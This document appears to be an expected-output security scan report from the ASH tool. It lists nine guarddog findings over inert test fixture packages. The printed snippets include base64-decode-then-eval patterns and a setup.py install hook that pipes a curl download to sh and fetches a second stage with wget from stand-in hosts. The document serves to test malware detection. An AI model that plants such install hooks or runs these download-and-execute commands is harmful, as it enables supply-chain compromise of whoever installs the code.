# ASH Security Scan Report

- **Report generated**: <TIMESTAMP>
- **Time since scan**: <DURATION>

## Scan Metadata

- **Project**: ASH
- **Scan executed**: <TIMESTAMP>
- **ASH version**: <ASH_VERSION>

## Summary

### Scanner Results

The table below shows findings by scanner, with status based on severity thresholds and dependencies:

- **Severity levels**:
  - **Suppressed (S)**: Findings that have been explicitly suppressed and don't affect scanner status
  - **Critical (C)**: Highest severity findings that require immediate attention
  - **High (H)**: Serious findings that should be addressed soon
  - **Medium (M)**: Moderate risk findings
  - **Low (L)**: Lower risk findings
  - **Info (I)**: Informational findings with minimal risk
- **Actionable**: Number of findings at or above the threshold severity level that require attention
- **Result**:
  - **PASSED** = No findings at or above threshold
  - **FAILED** = Findings at or above threshold
  - **MISSING** = Required dependencies not available
  - **SKIPPED** = Scanner explicitly disabled
  - **ERROR** = Scanner execution error
- **Threshold**: The minimum severity level that will cause a scanner to fail
  - Thresholds: ALL, LOW, MEDIUM, HIGH, CRITICAL
  - Source: Values in parentheses indicate where the threshold is set:
    - `global` (global_settings section in the ASH_CONFIG used)
    - `config` (scanner config section in the ASH_CONFIG used)
    - `scanner` (default configuration in the plugin, if explicitly set)
- **Statistics calculation**:
  - All statistics are calculated from the final aggregated SARIF report
  - Suppressed findings are counted separately and do not contribute to actionable findings
  - Scanner status is determined by comparing actionable findings to the threshold

| Scanner | Suppressed | Critical | High | Medium | Low | Info | Actionable | Result | Threshold |
| --- | ---: | ---: | ---: | ---: | ---: | ---: | ---: | --- | --- |
| guarddog | 0 | 0 | 9 | 0 | 0 | 0 | 9 | FAILED | MEDIUM (global) |

### Top 5 Hotspots

Files with the highest number of security findings:

| Finding Count | File Location |
| ---: | --- |
| 5 | pypi_suspicious/setup.py |
| 1 | action_suspicious/index.js |
| 1 | go_suspicious/main.go |
| 1 | npm_suspicious/index.js |
| 1 | gem_suspicious/lib/ash_guarddog_fixture.rb |

<h2>Detailed Findings</h2>

<details>
<summary>Show 9 actionable findings</summary>

### Finding 1: threat-runtime-obfuscation-base64exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-runtime-obfuscation-base64exec
- **Location**: action_suspicious/index.js:2

**Description**:
Detects base64 decoding followed by code execution. MITRE ATT&CK tactics: defense-evasion

**Code Snippet**:
```
// Inert test fixture. Never run.
throw new Error("inert test fixture");
eval(Buffer.from("Y29uc29sZS5sb2coJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==", "base64").toString());
```

---

### Finding 2: threat-runtime-obfuscation-base64exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-runtime-obfuscation-base64exec
- **Location**: go_suspicious/main.go:11

**Description**:
Detects base64 decoding followed by code execution. MITRE ATT&CK tactics: defense-evasion

**Code Snippet**:
```
panic("inert test fixture")
	payload, _ := base64.StdEncoding.DecodeString("ZWNobyBpbmVydA==")
	exec.Command("sh", "-c", string(payload)).Run()
}
```

---

### Finding 3: threat-runtime-obfuscation-base64exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-runtime-obfuscation-base64exec
- **Location**: npm_suspicious/index.js:3

**Description**:
Detects base64 decoding followed by code execution. MITRE ATT&CK tactics: defense-evasion

**Code Snippet**:
```
// payload decodes to a console.log() call.
throw new Error("inert test fixture");
eval(Buffer.from("Y29uc29sZS5sb2coJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ==", "base64").toString());
```

---

### Finding 4: threat-network-exfiltration

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-network-exfiltration
- **Location**: pypi_suspicious/setup.py:17

**Description**:
Detects URLs to suspicious domains often used for exfiltration or C2; correlated with capability capability-network-lolbas. MITRE ATT&CK tactics: exfiltration

**Code Snippet**:
```
os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
        install.run(self)
```

---

### Finding 5: threat-process-download-exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-process-download-exec
- **Location**: pypi_suspicious/setup.py:16

**Description**:
Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&CK tactics: execution

**Code Snippet**:
```
exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
        install.run(self)
```

---

### Finding 6: threat-process-download-exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-process-download-exec
- **Location**: pypi_suspicious/setup.py:17

**Description**:
Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&CK tactics: execution

**Code Snippet**:
```
os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
        install.run(self)
```

---

### Finding 7: threat-process-download-exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-process-download-exec
- **Location**: pypi_suspicious/setup.py:15

**Description**:
Detects download-and-execute patterns: fetching a remote file then executing it. MITRE ATT&CK tactics: execution

**Code Snippet**:
```
def run(self):
        exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
```

---

### Finding 8: threat-runtime-obfuscation-base64exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-runtime-obfuscation-base64exec
- **Location**: pypi_suspicious/setup.py:15

**Description**:
Detects base64 decoding followed by code execution. MITRE ATT&CK tactics: defense-evasion

**Code Snippet**:
```
def run(self):
        exec(base64.b64decode("cHJpbnQoJ2luZXJ0IGd1YXJkZG9nIGZpeHR1cmUnKQ=="))
        os.system("curl -s https://example.com/payload.sh | sh")
        os.system("wget http://203.0.113.10/stage2 -O /tmp/stage2")
```

---

### Finding 9: threat-runtime-obfuscation-base64exec

- **Severity**: HIGH
- **Scanner**: guarddog
- **Rule ID**: threat-runtime-obfuscation-base64exec
- **Location**: gem_suspicious/lib/ash_guarddog_fixture.rb:4

**Description**:
Detects base64 decoding followed by code execution. MITRE ATT&CK tactics: defense-evasion

**Code Snippet**:
```
raise "inert test fixture"
require "base64"
eval(Base64.decode64("cHV0cyAnaW5lcnQgZ3VhcmRkb2cgZml4dHVyZSc="))
```

</details>

---

*Report generated by [Automated Security Helper (ASH)](https://github.com/awslabs/automated-security-helper) at <TIMESTAMP>*
